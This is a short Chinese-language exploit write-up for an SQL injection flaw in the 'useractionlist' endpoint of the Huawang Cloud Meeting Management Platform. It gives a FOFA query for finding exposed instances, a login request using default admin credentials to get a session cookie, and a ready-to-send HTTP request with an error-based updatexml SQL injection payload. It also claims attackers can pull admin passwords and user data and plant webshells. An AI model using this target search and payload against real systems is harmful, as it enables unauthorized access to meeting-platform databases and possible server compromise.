# 华望云会议管理平台useractionlist存在SQL注入漏洞

华望云会议管理平台 `useractionlist` 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```javascript
title="华望云会议管理平台"
```

## poc

获取cookie

```javascript
POST /ajax/userlogin HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
X-Requested-With: XMLHttpRequest

userNameCopy=admin&userName=admin&passWordCopy=admin&passWord=21232f297a57a5a743894a0e4a801fc3
```

将获取到cookie填入下面poc中

```javascript
POST /page/useractionlist?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+user())),1))+and+'%25%25'+like+'&dpId=1&params[]=displayName&params[]=userName HTTP/1.1
Host: 
X-Requested-With: XMLHttpRequest
Cookie: uid=112; JSESSIONID=8E8A139355E2047CEAC6B307396968A8; languageGlobal=1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```

![e034ce0d97d2420ea913de1498bfe951.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409132251636.png)

![1b610ed8f77245f99e98203c9b8c2f1b.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409132249981.png)